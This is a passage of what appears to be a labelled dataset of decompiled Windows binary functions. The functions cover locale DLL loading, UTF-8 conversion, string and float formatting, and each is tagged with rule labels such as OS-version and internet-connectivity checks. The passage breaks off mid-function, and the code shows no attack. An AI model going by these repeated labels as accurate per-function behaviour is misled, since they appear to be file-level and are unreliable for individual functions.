        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406c2c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00406c2c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00406c2c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x406e5c;\n    uVar5 = 0x80000001;\n    noname_12 = 0x406c6b;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00406c2c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x406e5c;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x406c89;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00406c2c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x406e78;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00406c2c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00406c2c::lpLibFileName);\n                    for (puVar3 = &fcn.00406c2c::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00406c2c::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00406c2c::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_12h, 0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00406c2c::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00406c2c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406c2c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00406a68(noname_0, 0x406d31, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00406c2c::lpLibFileName, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x406e98, 0, 0, &fcn.00406c2c::var_12h, &fcn.00406c2c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406d38);\n    return iVar1;\n}\n",
        "token_count": 1615
    },
    "00406f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406f30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x48f044;\n    if (*0x48f044 != NULL) {\n        do {\n            uStack32 = 0x406f6b;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00407180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407180(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "0040725c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040725c(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 848
    },
    "004085c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004085c4(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x408674, 0x408660);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x40867c);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x40868c);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4086a4);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 339
    },
    "004086bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004086bc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4086f7;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x495800 = *0x495800 + 1;\n    if ((*0x495800 == 0) && (*0x495804 != 0)) {\n        iStack20 = *0x495804;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 170
    },
    "0040f760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040f760(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040f71c();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040f594();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040f4f8();\n        }\n        while( true ) {\n            iVar2 = fcn.0040f518();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040f518();\n            if (iVar2 != 0) {\n                fcn.0040f750();\n            }\n        }\n        fcn.0040f71c();\n        if (bVar4) {\n            fcn.0040f504();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040f4f8();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 387
    },
    "00409ecc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00409ecc(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403ec4();\n    if (iStack20 != 0) {\n        fcn.0040975c();\n    }\n    return uVar1;\n}\n",
        "token_count": 68
    },
    "00409f08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f08(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00409f20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f20(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403ec4();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00409f40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409f40(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00406554();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 98
    },
    "0040a858": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a858(void)\n\n{\n    ushort uVar1;\n    char *in_EAX;\n    ushort *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    if (*in_EAX == '\\0') {\n        return 0;\n    }\n    puVar2 = in_EAX + 1 & 0xfffffffe;\n    while( true ) {\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + 1;\n            uVar3 = uVar1;\n            uVar4 = uVar1 >> 8;\n        } while ((uVar3 & uVar4) != 0);\n        if (uVar3 == 0) break;\n        if (uVar4 == 0) {\n            return -in_EAX + -1 + puVar2;\n        }\n    }\n    return -in_EAX + -2 + puVar2;\n}\n",
        "token_count": 210
    },
    "0040ab60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040ab60(void)\n\n{\n    if (**0x492788 != NULL) {\n        (***0x492788)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 48
    },
    "0040ab90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ac5f)\n\nvoid __cdecl fcn.0040ab90(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x0040abb9:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x0040abe3;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x0040aef7:\n    fcn.0040aee7();\n    return;\ncode_r0x0040abe3:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x0040aef7;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040ac72(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x0040ac02;\n    if (in_ECX == extraout_ECX) goto code_r0x0040aef7;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x0040abe3;\ncode_r0x0040ac02:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x0040aef7;\n        in_ECX = in_ECX + 1;\n        fcn.0040ac72(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.0040acba(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x0040abb9;\n}\n",
        "token_count": 1194
    },
    "0040ac72": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac72(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x0040aef7:\n            fcn.0040aee7();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x0040aef7;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0040b0bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b0bc(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040b390(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.0040b1bb();\n        puVar4 = extraout_ECX * 3 + 0x40b1ac;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x40b198))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 448
    },
    "0040b1bb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b1bb(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0040b390": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b390(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040b3bd(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040b4df(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0040b3bd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3bd(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040b3e8:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00404124();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x48f880);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x48f88c);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040b3e8;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = 